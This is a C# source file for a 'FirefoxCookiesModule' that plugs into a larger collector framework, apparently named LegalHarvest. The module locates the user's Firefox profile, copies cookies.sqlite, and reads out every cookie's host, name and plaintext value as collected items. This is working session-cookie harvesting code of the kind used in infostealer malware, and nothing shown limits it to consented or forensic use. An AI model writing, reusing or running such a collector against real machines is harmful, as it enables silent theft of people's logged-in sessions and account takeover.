using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;

namespace LegalHarvest.Modules
{
    public class FirefoxCookiesModule : ICollectorModule
    {
        public string ModuleName => "FirefoxCookies";
        public bool CanExecute()
        {
            string profileDir = GetProfileDirectory();
            return profileDir != null && File.Exists(Path.Combine(profileDir, "cookies.sqlite"));
        }

        private string GetProfileDirectory()
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string firefoxDir = Path.Combine(appData, "Mozilla", "Firefox", "Profiles");
            if (!Directory.Exists(firefoxDir)) return null;
            foreach (string dir in Directory.GetDirectories(firefoxDir))
                if (File.Exists(Path.Combine(dir, "cookies.sqlite"))) return dir;
            return null;
        }

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string profileDir = GetProfileDirectory();
            if (profileDir == null) return items;

            string tempDb = Path.GetTempFileName();
            File.Copy(Path.Combine(profileDir, "cookies.sqlite"), tempDb, true);
            try
            {
                using (var conn = new SQLiteConnection($"Data Source={tempDb};Version=3;"))
                {
                    conn.Open();
                    string query = "SELECT host, name, value FROM moz_cookies";
                    using (var cmd = new SQLiteCommand(query, conn))
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                            items.Add(new CollectedItem { Category = "FirefoxCookies", Name = reader["host"].ToString(), Value = $"{reader["name"]}={reader["value"]}", Timestamp = DateTime.Now });
                    }
                }
            }
            finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
            return items;
        }
    }
}
